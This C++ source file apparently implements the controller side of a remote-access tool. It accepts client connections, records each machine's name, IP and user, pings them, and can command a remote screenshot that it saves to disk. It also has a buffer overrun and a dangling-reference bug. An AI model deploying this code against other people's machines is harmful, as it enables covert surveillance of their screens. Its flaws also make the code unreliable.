#include "server.h"
#include <iostream>

WSADATA Server::wsaData;
SOCKET Server::serverSocket;
sockaddr_in Server::serverAddr;

Server::Server()
{
	getCurrentTime();
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(8080);
	serverAddr.sin_addr.s_addr = INADDR_ANY;

	bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
	listen(serverSocket, SOMAXCONN);

	//std::thread(&Server::printClients, this).detach();

	std::thread(&Server::startServer, this).detach();
}

void Server::startServer()
{
	while (true)
	{
		SOCKET clientSocket = accept(serverSocket, NULL, NULL);

		char buffer[512];
		int bytesReceived = recv(clientSocket, buffer, 512, 0);
		if (bytesReceived > 0)
		{
			buffer[bytesReceived] = '\0';
		}

		auto client = std::make_shared<Client>();
		client->socket = clientSocket;
		client->lastTimeActivity = getCurrentTime();

		std::string temp = "";
		int idx = 0;

		for (size_t i = 0; i < bytesReceived; ++i)
		{
			if (buffer[i] == '\n')
			{
				switch (idx)
				{
				case 0:
					client->machine = temp;
					break;
				case 1:
					client->ip = temp;
					break;
				case 2:
					client->user = temp;
					break;
				default:
					break;
				}
				++idx;
				temp = "";
			}
			else
				temp += buffer[i];
		}

		clients.push_back(client);

		//send(client->socket, "SCREENSHOT", 10, 0);


		std::thread([this, &client]() { checkClient(*client); }).detach();

	}
}

Server::~Server()
{
	for (auto& client : clients)
		closesocket(client->socket);

	closesocket(serverSocket);
	WSACleanup();
}

void Server::checkClient(Client& client)
{
	std::thread([this, &client]() {ping(client.socket); }).detach();
	while (true)
	{
		char buffer[512];
		int bytesReceived = recv(client.socket, buffer, 512, 0);
		if (bytesReceived > 0) 
		{
			buffer[bytesReceived] = '\0';
			std::cout << buffer << std::endl;

			if (strcmp(buffer, "PONG") == 0)
			{
				client.lastTimeActivity = getCurrentTime();
			}

			else if (strcmp(buffer, "SCREENSHOT") == 0)
			{
				receiveScreenshot(client.socket);
			}

		}
	}
}

std::string Server::getCurrentTime()
{
	std::time_t now = std::time(nullptr);
	std::tm local_time;

	localtime_s(&local_time, &now);

	char buffer[80];
	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &local_time);

	return std::string(buffer);
}

void Server::printClients()
{
	while (true)
	{
		system("cls");
		for (size_t i = 0; i < clients.size(); ++i)
		{
			std::cout << i+1 << ". " << clients[i]->machine << "\t" 
				<< clients[i]->ip << "\t" << clients[i]->user << "\t"
				<< clients[i]->lastTimeActivity << std::endl;
		}

		std::this_thread::sleep_for(std::chrono::seconds(3));
	}
}

void Server::receiveScreenshot(SOCKET& clientSocket) {
	size_t size;
	recv(clientSocket, (char*)&size, sizeof(size), 0);

	std::vector<char> buffer(size);
	recv(clientSocket, buffer.data(), size, 0);

	std::ofstream ofs("screenshot.jpg", std::ios::binary);
	ofs.write(buffer.data(), size);
	ofs.close();
}

std::vector<std::shared_ptr<Client>> Server::getClients()
{
	return clients;
}

void Server::makeScreenshot(int idOfClient)
{
	send(clients[idOfClient]->socket, "SCREENSHOT", 10, 0);
}

void Server::ping(SOCKET& clientSocket)
{
	while (true)
	{
		send(clientSocket, "PING", 4, 0);
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}